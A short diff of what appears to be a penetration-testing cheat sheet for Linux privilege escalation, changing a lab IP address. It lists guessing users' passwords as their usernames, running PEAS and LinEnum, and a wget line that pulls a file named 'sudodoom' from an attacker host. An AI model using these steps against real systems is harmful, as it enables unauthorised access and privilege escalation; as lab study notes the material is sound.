@@ -64,7 +64,7 @@ dpkg -l
 3. su into other users using their usernames as passwords; vagrant:vagrant
 4. Run PEAS and LinEnum
 ```shell 
-wget 192.168.45.x/sudodoom
+wget 10.10.14.18/sudodoom
 ```
 
 ```bash
